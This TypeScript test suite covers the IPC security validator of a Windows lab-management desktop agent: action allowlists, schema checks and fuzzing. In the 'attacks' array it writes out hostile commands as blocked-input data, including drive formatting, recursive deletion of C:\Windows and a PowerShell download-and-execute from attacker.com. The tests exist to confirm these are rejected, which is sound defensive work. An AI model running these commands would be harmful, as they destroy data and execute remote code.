import test from "node:test";
import assert from "node:assert/strict";

import {
  IPC_CONSTANTS,
  ALLOWED_IPC_ACTIONS,
  IpcEnvelope
} from "../src/desktop/contracts";
import {
  MockDesktopAgent,
  validateIpcAction,
  validateNoArbitraryShell
} from "../src/desktop/mock-agent";

test("IPC constants define strictly required pipe name and protocol version", () => {
  assert.equal(IPC_CONSTANTS.PIPE_NAME, "WinLabService");
  assert.equal(IPC_CONSTANTS.PROTOCOL_VERSION, "1.0.0");
  assert.ok(ALLOWED_IPC_ACTIONS.includes("inventory.query"));
  assert.ok(ALLOWED_IPC_ACTIONS.includes("policy.query_state"));
  assert.ok(ALLOWED_IPC_ACTIONS.includes("preflight.query"));
  assert.ok(ALLOWED_IPC_ACTIONS.includes("presets.list"));
  assert.ok(ALLOWED_IPC_ACTIONS.includes("policy.preview_diff"));
  assert.ok(ALLOWED_IPC_ACTIONS.includes("config.validate"));
});

test("security validator blocks arbitrary shell execution strings", () => {
  const attacks = [
    "powershell.exe -ExecutionPolicy Bypass -File evil.ps1",
    "cmd.exe /c format c:",
    "pwsh.exe -Command Remove-Item -Recurse C:\\Windows",
    "iex (New-Object Net.WebClient).DownloadString('http://attacker.com')",
    "wscript.shell Run('notepad.exe')",
    "eval('malicious code')"
  ];

  for (const attack of attacks) {
    const result = validateNoArbitraryShell(attack);
    assert.equal(result.isSafe, false, `Expected to block attack: ${attack}`);
    assert.match(result.error ?? "", /Forbidden executable or script pattern/);
  }

  // Safe strings and JSON payloads pass
  const safePayload = JSON.stringify({
    profileName: "Microlins Lab",
    studentUser: "Aluno",
    adminUser: "Administrador"
  });
  const safeResult = validateNoArbitraryShell(safePayload);
  assert.equal(safeResult.isSafe, true);
});

test("security validator rejects empty or unlisted IPC actions", () => {
  assert.equal(validateIpcAction("").isValid, false);
  assert.equal(validateIpcAction("   ").isValid, false);

  const unlisted = validateIpcAction("system.format_drive");
  assert.equal(unlisted.isValid, false);
  assert.equal(unlisted.errorCode, "UNAUTHORIZED_ACTION");

  const unlistedShell = validateIpcAction("system.exec_shell");
  assert.equal(unlistedShell.isValid, false);
  assert.equal(unlistedShell.errorCode, "UNAUTHORIZED_ACTION");
});

test("security validator blocks privileged mutating actions in foundation desktop stage", () => {
  // Apply e Rollback devem ser bloqueados nesta etapa (sem executor privilegiado)
  const applyCheck = validateIpcAction(IPC_CONSTANTS.ACTION_APPLY_POLICIES);
  assert.equal(applyCheck.isValid, false);
  assert.equal(applyCheck.errorCode, "PRIVILEGED_EXECUTOR_DISABLED");
  assert.match(applyCheck.error ?? "", /Privileged policy execution is disabled/);

  const rollbackCheck = validateIpcAction(IPC_CONSTANTS.ACTION_ROLLBACK_POLICIES);
  assert.equal(rollbackCheck.isValid, false);
  assert.equal(rollbackCheck.errorCode, "PRIVILEGED_EXECUTOR_DISABLED");
});

test("security validator allows valid read-only query and preview actions", () => {
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_QUERY_INVENTORY).isValid, true);
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_QUERY_POLICY_STATE).isValid, true);
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_QUERY_PREFLIGHT).isValid, true);
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_LIST_PRESETS).isValid, true);
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_PREVIEW_POLICY_DIFF).isValid, true);
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_VALIDATE_CONFIG).isValid, true);
});

test("MockDesktopAgent returns structured read-only inventory conforming to schema", async () => {
  const agent = new MockDesktopAgent();
  const envelope: IpcEnvelope = {
    id: "req-inv-1",
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "query",
    action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY
  };

  const res = await agent.handleRequest(envelope);
  assert.equal(res.success, true);
  assert.equal(res.replyToId, "req-inv-1");

  const inv = res.data as ReturnType<typeof agent.getMockInventory>;
  assert.equal(inv.computerName, "LAB-MICROLINS-01");
  assert.equal(inv.windows.caption, "Windows 11 Pro");
  assert.equal(inv.windows.architecture, "64 bits");
  assert.ok(inv.detectedApps.length > 0);
  assert.ok(inv.localUsers.some((u) => u.name === "Aluno" && !u.isAdmin));
  assert.ok(inv.localUsers.some((u) => u.name === "Administrador" && u.isAdmin));
});

test("MockDesktopAgent returns policy state summary with unconfigured initial state", async () => {
  const agent = new MockDesktopAgent();
  const envelope: IpcEnvelope = {
    id: "req-pol-1",
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "query",
    action: IPC_CONSTANTS.ACTION_QUERY_POLICY_STATE
  };

  const res = await agent.handleRequest(envelope);
  assert.equal(res.success, true);

  const pol = res.data as ReturnType<typeof agent.getMockPolicyState>;
  assert.equal(pol.totalPolicies, 6);
  assert.equal(pol.appliedCount, 0);
  assert.equal(pol.notConfiguredCount, 6);
  assert.ok(pol.items.every((item) => item.currentState === "NotConfigured"));
});

test("MockDesktopAgent rejects malicious payload containing shell injection", async () => {
  const agent = new MockDesktopAgent();
  const malicious: IpcEnvelope = {
    id: "req-malicious-1",
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "command",
    action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY,
    payload: { filter: "powershell.exe -enc Zm9v" }
  };

  const res = await agent.handleRequest(malicious);
  assert.equal(res.success, false);
  assert.equal(res.errorCode, "FORBIDDEN_SHELL_INJECTION");
  assert.match(res.error ?? "", /Forbidden executable or script pattern/);
});

test("MockDesktopAgent rejects attempt to invoke apply policies in foundation stage", async () => {
  const agent = new MockDesktopAgent();
  const applyEnvelope: IpcEnvelope = {
    id: "req-apply-1",
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "command",
    action: IPC_CONSTANTS.ACTION_APPLY_POLICIES,
    payload: { targetUser: "Aluno" }
  };

  const res = await agent.handleRequest(applyEnvelope);
  assert.equal(res.success, false);
  assert.equal(res.errorCode, "PRIVILEGED_EXECUTOR_DISABLED");
});

test("validateEnvelopeSchema enforces structural typing and rejects command fields", async () => {
  const { validateEnvelopeSchema } = await import("../src/desktop/mock-agent");

  // Rejeita valores não-objeto
  assert.equal(validateEnvelopeSchema(null).isValid, false);
  assert.equal(validateEnvelopeSchema("string").isValid, false);
  assert.equal(validateEnvelopeSchema([]).isValid, false);

  // Rejeita envelope sem id
  assert.equal(
    validateEnvelopeSchema({
      version: "1.0.0",
      type: "query",
      action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY
    }).isValid,
    false
  );

  // Rejeita tipo inválido
  assert.equal(
    validateEnvelopeSchema({
      id: "test-1",
      version: "1.0.0",
      type: "arbitrary_type",
      action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY
    }).isValid,
    false
  );

  // Rejeita ação não-autorizada
  assert.equal(
    validateEnvelopeSchema({
      id: "test-2",
      version: "1.0.0",
      type: "query",
      action: "unauthorized.action"
    }).isValid,
    false
  );

  // Rejeita payload com campo de comando arbitrário
  const commandInjection = validateEnvelopeSchema({
    id: "test-3",
    version: "1.0.0",
    type: "command",
    action: IPC_CONSTANTS.ACTION_VALIDATE_CONFIG,
    payload: { command: "whoami" }
  });
  assert.equal(commandInjection.isValid, false);
  assert.equal(commandInjection.errorCode, "FORBIDDEN_COMMAND_FIELD");

  // Aceita envelope válido
  const valid = validateEnvelopeSchema({
    id: "test-4",
    version: "1.0.0",
    type: "query",
    action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY
  });
  assert.equal(valid.isValid, true);
});

test("WebViewIpcBridge detects environment and handles missing WebView2 runtime gracefully", async () => {
  const { isWebView2Available, WebViewIpcBridge, createDesktopTransport } = await import(
    "../src/desktop/ipc-bridge"
  );

  // No Node.js puro, window.chrome.webview não existe
  assert.equal(isWebView2Available(), false);

  const bridge = new WebViewIpcBridge(1000);
  assert.equal(bridge.isRunning, true);
  assert.equal(bridge.mode, "Native C# Host (WebView2 IPC)");

  const res = await bridge.handleRequest({
    id: "bridge-test-1",
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "query",
    action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY
  });

  assert.equal(res.success, false);
  assert.equal(res.errorCode, "WEBVIEW2_NOT_AVAILABLE");
  bridge.dispose();

  // createDesktopTransport faz fallback seguro para MockDesktopAgent fora do WebView2
  const transport = createDesktopTransport();
  assert.equal(transport.isRunning, true);
  assert.equal(transport.mode, "Unprivileged Mock (In-Memory Development)");
});

test("MockDesktopAgent guarantees typeof response.replyToId is string when envelope contains non-string id tokens", async () => {
  const agent = new MockDesktopAgent();
  const nonStringIdCases: Array<{ label: string; id: unknown }> = [
    { label: "numeric integer id", id: 12345 },
    { label: "numeric zero id", id: 0 },
    { label: "numeric float id", id: 3.14159 },
    { label: "boolean true id", id: true },
    { label: "boolean false id", id: false },
    { label: "object id", id: { tenant: "lab", session: 42 } },
    { label: "array id", id: [1, 2, 3] },
    { label: "null id", id: null },
    { label: "undefined id", id: undefined },
    { label: "function id", id: () => "id" }
  ];

  for (const tc of nonStringIdCases) {
    const envelope = {
      id: tc.id,
      version: IPC_CONSTANTS.PROTOCOL_VERSION,
      timestamp: new Date().toISOString(),
      type: "query",
      action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY
    } as unknown as IpcEnvelope;

    const res = await agent.handleRequest(envelope);
    assert.equal(res.success, false, `Expected failure for ${tc.label}`);
    assert.equal(res.errorCode, "INVALID_ENVELOPE_ID", `Expected INVALID_ENVELOPE_ID for ${tc.label}`);
    assert.equal(
      typeof res.replyToId,
      "string",
      `Expected res.replyToId to be string for ${tc.label}, got ${typeof res.replyToId}`
    );
    assert.equal(res.replyToId, "", `Expected res.replyToId to be empty string for non-string ${tc.label}`);
  }

  // Also verify when envelope itself is not a valid JSON object envelope
  const nonObjectEnvelopes: Array<{ label: string; envelope: unknown }> = [
    { label: "null envelope", envelope: null },
    { label: "undefined envelope", envelope: undefined },
    { label: "number envelope", envelope: 42 },
    { label: "array envelope", envelope: ["query", "inventory.query"] }
  ];

  for (const tc of nonObjectEnvelopes) {
    const res = await agent.handleRequest(tc.envelope as unknown as IpcEnvelope);
    assert.equal(res.success, false);
    assert.equal(res.errorCode, "INVALID_ENVELOPE_SCHEMA");
    assert.equal(
      typeof res.replyToId,
      "string",
      `Expected res.replyToId to be string for ${tc.label}, got ${typeof res.replyToId}`
    );
    assert.equal(res.replyToId, "");
  }
});

test("fuzz MockDesktopAgent with 1,000 randomized envelopes and extreme payloads confirming 100% schema conformance", async () => {
  const agent = new MockDesktopAgent();

  function assertConformance(resp: any, inputDesc: string) {
    assert.ok(resp && typeof resp === "object", `${inputDesc}: response must be object`);
    assert.equal(typeof resp.id, "string", `${inputDesc}: resp.id must be string`);
    assert.ok(resp.id.length > 0, `${inputDesc}: resp.id must not be empty`);
    assert.equal(typeof resp.replyToId, "string", `${inputDesc}: resp.replyToId must be string`);
    assert.equal(typeof resp.success, "boolean", `${inputDesc}: resp.success must be boolean`);

    if (resp.success) {
      assert.equal(resp.error, undefined, `${inputDesc}: success response error must be undefined`);
      assert.equal(resp.errorCode, undefined, `${inputDesc}: success response errorCode must be undefined`);
      assert.notEqual(resp.data, undefined, `${inputDesc}: success response data must be present`);
    } else {
      assert.equal(typeof resp.error, "string", `${inputDesc}: fail response error must be string`);
      assert.ok(resp.error.trim().length > 0, `${inputDesc}: fail response error must not be empty`);
      assert.equal(typeof resp.errorCode, "string", `${inputDesc}: fail response errorCode must be string`);
      assert.ok(resp.errorCode.trim().length > 0, `${inputDesc}: fail response errorCode must not be empty`);
      assert.equal(resp.data, undefined, `${inputDesc}: fail response data must be undefined`);
    }
  }

  // 1. Extreme payloads
  const extreme100k = await agent.handleRequest({
    id: "ext-100k",
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "query",
    action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY,
    payload: "A".repeat(100 * 1024)
  });
  assertConformance(extreme100k, "Extreme 100KB payload");
  assert.equal(extreme100k.success, true);
  assert.equal(extreme100k.replyToId, "ext-100k");

  const extreme5mb = await agent.handleRequest({
    id: "ext-5mb",
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "query",
    action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY,
    payload: "C".repeat(5 * 1024 * 1024)
  });
  assertConformance(extreme5mb, "Extreme 5MB payload");
  assert.equal(extreme5mb.success, true);

  const hugeId = "ID-" + "Z".repeat(50000);
  const extremeHugeId = await agent.handleRequest({
    id: hugeId,
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "query",
    action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY
  });
  assertConformance(extremeHugeId, "Extreme 50K char ID");
  assert.equal(extremeHugeId.replyToId, hugeId);

  // 2. 1,000 Randomized fuzz iterations
  const randomKeys = ["cmd", "shell", "exec", "script", "id", "type", "action", "payload", "randomKey"];
  const randomChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;':\",./<>?`~\0\n\r\t \t ";

  for (let i = 0; i < 1000; i++) {
    let randomPayload: any;
    const mode = i % 6;
    if (mode === 0) {
      randomPayload = Array.from({ length: 10 + (i % 50) }, () => randomChars[Math.floor(Math.random() * randomChars.length)]).join("");
    } else if (mode === 1) {
      randomPayload = {
        [randomKeys[i % randomKeys.length]]: randomChars.slice(0, 10 + (i % 20))
      };
    } else if (mode === 2) {
      randomPayload = Array.from({ length: i % 100 }, (_, idx) => idx);
    } else if (mode === 3) {
      randomPayload = null;
    } else if (mode === 4) {
      randomPayload = (i % 2 === 0);
    } else {
      randomPayload = i * 1.5;
    }

    const testId = i % 4 === 0 ? `fuzz-${i}` : (i % 4 === 1 ? (i as any) : (i % 4 === 2 ? null : "   "));
    const testAction = i % 3 === 0 ? IPC_CONSTANTS.ACTION_QUERY_INVENTORY : (i % 3 === 1 ? "invalid.action" : IPC_CONSTANTS.ACTION_APPLY_POLICIES);
    const testType = i % 2 === 0 ? "query" : "invalid_type";

    const res = await agent.handleRequest({
      id: testId,
      version: IPC_CONSTANTS.PROTOCOL_VERSION,
      timestamp: new Date().toISOString(),
      type: testType,
      action: testAction,
      payload: randomPayload
    } as any);

    assertConformance(res, `Fuzz iteration #${i}`);
  }
});


